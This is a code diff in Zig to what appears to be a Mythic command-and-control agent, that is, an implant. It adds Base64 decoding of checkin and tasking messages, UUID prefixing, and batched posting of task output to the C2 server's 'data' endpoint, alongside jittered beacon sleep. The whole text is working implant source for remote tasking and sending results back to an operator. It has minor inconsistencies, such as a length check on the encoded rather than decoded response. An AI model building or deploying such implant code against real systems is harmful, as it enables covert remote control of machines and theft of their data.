@@ -49,10 +49,10 @@ pub const MythicAgent = struct {
         var crypto_utils = CryptoUtils.init(allocator);
         
         // Generate UUIDs and keys
-        const uuid = "8c98266e-7353-4c76-91a2-9bfbbc3f3bc6";
+        const uuid = "a5c7bb07-e66c-4893-a6e9-edbc19c01d31";
         const session_id = try crypto_utils.generateSessionId();
         const aes_key = CryptoUtils.generateAESKey();
-        const payload_uuid = "8c98266e-7353-4c76-91a2-9bfbbc3f3bc6";
+        const payload_uuid = "a5c7bb07-e66c-4893-a6e9-edbc19c01d31";
         
         return Self{
             .allocator = allocator,
@@ -177,14 +177,29 @@ pub const MythicAgent = struct {
 
         print("[DEBUG] Response: {s}\n", .{response});
 
+        //Parse Base64-encoded response (CallbackUUID + JSON)
+        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
+            print("[ERROR] Invalid Base64 response\n", .{});
+            return error.InvalidBase64;
+        };
+        const decoded_response = try self.allocator.alloc(u8, decoded_len);
+        defer self.allocator.free(decoded_response);
+        base64.standard.Decoder.decode(decoded_response, response) catch {
+            print("[ERROR] Failed to decode Base64 response\n", .{});
+            return error.InvalidBase64;
+        };
+
+        print("[DEBUG] Decoded Response (UUID+JSON): {s}\n", .{decoded_response});
+
         // Skip CallbackUUID
         if (response.len < 36) {
             print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
         }
-        
+        const json_response = decoded_response[36..];
+        print("[DEBUG] JSON Response to parse: {s}\n", .{json_response});
         // Parse JSON response
-        const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch |err| {
+        const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
             print("[ERROR] Failed to parse checkin JSON: {}\n", .{err});
             return err;
         };
@@ -228,26 +243,27 @@ pub const MythicAgent = struct {
         _ = encoder.encode(b64_data, combined.items);
         print("[DEBUG] Base64 encoded tasking request: {s}\n", .{b64_data});
 
-        const response = try self.network_client.sendRequest("/data", b64_data);
+        const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
         
-        if (response.len == 0) {
-            print("[ERROR] Empty tasking response from server\n", .{});
-            return error.EmptyResponse;
-        }
-
-        // Parse Base64-encoded response (CallbackUUID + JSON)
-        //const decoded_response = try self.allocator.alloc(u8, base64.standard.Decoder.calcSizeForSlice(response) catch {
-        //    print("[ERROR] Invalid Base64 response\n", .{});
-        //    return error.InvalidBase64;
-        //});
         print("[DEBUG] Response: {s}\n", .{response});
-        //defer self.allocator.free(decoded_response);
-        //base64.standard.Decoder.decode(decoded_response, response) catch {
-        //    print("[ERROR] Failed to decode Base64 response\n", .{});
-        //    return error.InvalidBase64;
-        //};
-        // Skip CallbackUUID (15 bytes for "payload-uuid-456")
+
+        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
+            print("[ERROR] Invalid Base64 response\n", .{});
+            return error.InvalidBase64;
+        };
+        const decoded_response = try self.allocator.alloc(u8, decoded_len);
+        defer self.allocator.free(decoded_response);
+
+        base64.standard.Decoder.decode(decoded_response, response) catch {
+            print("[ERROR] Failed to decode Base64 response\n", .{});
+            return error.InvalidBase64;
+        };
+
+        print("[DEBUG] Decoded Response (UUID+JSON): {s}\n", .{decoded_response});
+
+        
+        // Skip CallbackUUID 
         if (response.len < 36) {
             print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
@@ -260,7 +276,11 @@ pub const MythicAgent = struct {
             timestamp: i64,
             parameters: json.Value,
         };
-        const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, response, .{}) catch |err| {
+        const json_response = decoded_response[36..];
+        print("[DEBUG] JSON Response to parse: {s}\n", .{json_response});
+        
+        // Parse JSON response
+        const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
             print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
             return err;
         };
@@ -278,7 +298,7 @@ pub const MythicAgent = struct {
         }
     
         // Parse response for new tasks
-        try self.parseTaskResponse(response);
+        try self.parseTaskResponse(json_response);
     }
     
     // Parse task response from C2
@@ -345,48 +365,65 @@ pub const MythicAgent = struct {
     }
     
     // Send responses back to C2
+
     fn sendResponses(self: *Self) !void {
         if (self.pending_responses.items.len == 0) return;
-        
-        // Define the response struct type explicitly
+
         const ResponseObj = struct {
             task_id: []const u8,
             user_output: ?[]const u8 = null,
             completed: bool = true,
             status: []const u8,
         };
-        
-        // Create an array of response objects
+
         var responses = std.ArrayList(ResponseObj).init(self.allocator);
         defer responses.deinit();
-        
+
         for (self.pending_responses.items) |response| {
-            const response_obj = ResponseObj{
+            try responses.append(ResponseObj{
                 .task_id = response.task_id,
                 .user_output = response.user_output,
                 .completed = response.completed,
                 .status = response.status,
-            };
-            try responses.append(response_obj);
+            });
         }
-        
+
         const response_data = .{
             .action = "post_response",
             .responses = responses.items,
         };
-        
-        const json_data = try json.stringifyAlloc(self.allocator, response_data, .{});
-        defer self.allocator.free(json_data);
-        print("[DEBUG] Sending batch response JSON: {s}\n", .{json_data}); 
 
-        const server_response = try self.network_client.sendRequest("/data", json_data);
+        // Step 1: Convert to JSON
+        var json_buffer = std.ArrayList(u8).init(self.allocator);
+        defer json_buffer.deinit();
+        try json.stringify(response_data, .{}, json_buffer.writer());
+
+        // Step 2: Prepend UUID (callback UUID, not payload UUID)
+        var combined = std.ArrayList(u8).init(self.allocator);
+        defer combined.deinit();
+        try combined.appendSlice(self.payload_uuid); // Use self.uuid here
+        try combined.appendSlice(json_buffer.items);
+
+        // Step 3: Base64 encode it
+        const encoder = base64.standard.Encoder;
+        const b64_len = encoder.calcSize(combined.items.len);
+        const b64_data = try self.allocator.alloc(u8, b64_len);
+        defer self.allocator.free(b64_data);
+        _ = encoder.encode(b64_data, combined.items);
+
+        print("[DEBUG] Sending post_response with UUID {s}: {s}\n", .{ self.payload_uuid, json_buffer.items });
+        print("[DEBUG] Base64 encoded response: {s}\n", .{b64_data});
+
+        // Step 4: Send the base64-encoded payload
+        const server_response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(server_response);
-        
+
         print("[+] Sent {} responses in batch\n", .{self.pending_responses.items.len});
-        
-        // Clear pending responses
+
+        // Step 5: Clear after successful send
         self.pending_responses.clearAndFree();
     }
+
     // Sleep with jitter
     fn sleep(self: *Self) void {
         const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
